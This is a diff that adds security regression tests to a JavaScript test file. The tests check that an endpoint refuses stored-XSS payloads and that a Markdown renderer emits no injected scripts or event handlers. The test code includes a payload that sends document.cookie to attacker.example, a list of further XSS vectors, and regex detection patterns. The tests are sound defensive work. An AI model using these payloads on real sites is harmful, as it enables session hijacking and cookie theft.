@@ -16,6 +16,7 @@ import assert from 'node:assert/strict';
 import { generateKeyPairSync } from 'node:crypto';
 
 import { handleAcceptance, handleAnswer } from '../api/lib/handlers.mjs';
+import { renderMarkdown } from '../src/markdown.mjs';
 
 const { privateKey } = generateKeyPairSync('rsa', {
   modulusLength: 2048,
@@ -533,4 +534,93 @@ test('decision 35: no request path can write to a manifest, a roadmap or a confi
     assert.ok(!url.includes('ROADMAP'), 'the roadmap was written');
     assert.ok(!url.includes('atlas.config.json'), "the project's config was written");
   }
+});
+
+// --- C1: the endpoint is the boundary between an invitation and the corpus ------------------------
+
+// Verbatim from the security review, which posted exactly this through the real handler with a
+// valid `author` principal and got it back out of the built site.
+const XSS =
+  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';
+
+test('answer: the stored-XSS payload is refused, and nothing is committed', async () => {
+  const github = repo();
+  const response = await handleAnswer(
+    post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer: XSS }),
+    deps(github),
+  );
+
+  assert.equal(response.status, 400);
+  assert.equal(response.body.error, 'invalid-payload');
+  assert.match(response.body.message, /HTML/i);
+  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
+  assert.equal(github.files.get(REGISTER_PATH).text, REGISTER, 'the register was written to anyway');
+});
+
+test('acceptance: the same payload is refused in a note — both bodies, not just the answer', async () => {
+  const github = repo();
+  const response = await handleAcceptance(
+    post(AUTHOR, { workstream: 'a-stream', milestone: 'M1', result: 'fail', note: XSS }),
+    deps(github),
+  );
+
+  assert.equal(response.status, 400);
+  assert.match(response.body.message, /HTML/i);
+  assert.equal(github.calls.filter((c) => c.method === 'PUT').length, 0);
+});
+
+test('answer: whatever an author CAN write renders with no markup of their making in it', async () => {
+  // The property rather than one payload: run a spread of hostile bodies through the real
+  // endpoint, take whatever actually landed in the register, render it the way the site renders
+  // it, and look for markup that was not already in the record.
+  const attempts = [
+    XSS,
+    '<svg/onload=alert(1)>',
+    '</p><script>alert(1)</script>',
+    'javascript:alert(1)',
+    '[click me](javascript:alert(1))',
+    '[click me](vbscript:alert(1))',
+    '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
+    'Injected Heading\n================',
+    'Injected\n---',
+    '&lt;script&gt;alert(1)&lt;/script&gt;',
+    'plain prose, 3 < 4, and a [link](https://example.com)',
+  ];
+
+  const before = renderMarkdown(REGISTER, { hrefBase: '' });
+  const headingsBefore = (before.match(/<h[1-6]/gi) ?? []).length;
+
+  for (const answer of attempts) {
+    const github = repo();
+    await handleAnswer(post(AUTHOR, { workstream: 'a-stream', question: 'Q1', answer }), deps(github));
+    const html = renderMarkdown(github.files.get(REGISTER_PATH).text, { hrefBase: '' });
+
+    assert.ok(!/<script/i.test(html), `${JSON.stringify(answer)} put a script tag on the page`);
+    assert.ok(
+      !/\son(error|load|click|focus|mouseover)\s*=/i.test(html),
+      `${JSON.stringify(answer)} put an event handler on the page`,
+    );
+    assert.ok(
+      !/<(iframe|svg|object|embed|form|input)/i.test(html),
+      `${JSON.stringify(answer)} put a tag on the page`,
+    );
+    assert.ok(
+      !/(href|src)\s*=\s*"\s*(javascript|vbscript|data):/i.test(html),
+      `${JSON.stringify(answer)} put a script URL on the page`,
+    );
+    assert.equal(
+      (html.match(/<h[1-6]/gi) ?? []).length,
+      headingsBefore,
+      `${JSON.stringify(answer)} added a heading to the register`,
+    );
+  }
+});
+
+test('answer: the rule exists because the renderer really would run it — pinned, not assumed', () => {
+  // If this ever fails, `src/markdown.mjs` has stopped rendering inline HTML and the flat refusal
+  // in `whyNotWritableText` could be relaxed. Until then it is the whole reason for it: decision 11
+  // needs `html: true` for the corpus's `<sub>` citations, and the site carries no CSP.
+  const html = renderMarkdown(`# A record\n\n${XSS}\n`, { hrefBase: '' });
+  assert.match(html, /<script/i, 'the renderer no longer emits raw HTML — revisit the answer rule');
+  assert.match(html, /onerror/i);
 });
